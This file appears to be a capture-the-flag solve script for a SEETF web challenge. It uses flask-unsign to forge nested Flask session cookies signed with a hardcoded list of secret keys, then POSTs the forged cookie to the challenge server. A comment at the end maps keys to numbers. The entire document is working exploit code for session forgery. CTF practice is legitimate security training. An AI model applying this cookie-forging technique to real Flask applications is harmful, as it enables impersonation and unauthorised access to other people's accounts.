import requests
import subprocess

SECRET_KEYS = ["cdsn","aqoi","ewmu","aucl","bphi"]

def generate_cookie(secret_key,index=0):
	if index == len(SECRET_KEYS):
		cmd_out = subprocess.check_output(['flask-unsign', '--sign', '--cookie', '{"end": "' + secret_key + '"}', '--secret', secret_key])
		return cmd_out.decode('utf-8').strip()
	else:
		session_hash = generate_cookie(SECRET_KEYS[index], index+1)
		cmd_out = subprocess.check_output(['flask-unsign', '--sign', '--cookie', '{"key": "' + SECRET_KEYS[index] + '","session":"' + session_hash + '"}', '--secret', secret_key])
		return cmd_out.decode('utf-8').strip()

cookie = {'session' : generate_cookie(SECRET_KEYS[0])}
data = {"key":'cdsn'}
response = requests.post('http://福.web.seetf.sg:1337/%E7%A6%8F', cookies=cookie, data=data, proxies={'http':'http://localhost:8080'})

print(response.text)

'''
cdsn:41
aqoi:1728
ewmu:803
aucl:1463
bphi:88888
'''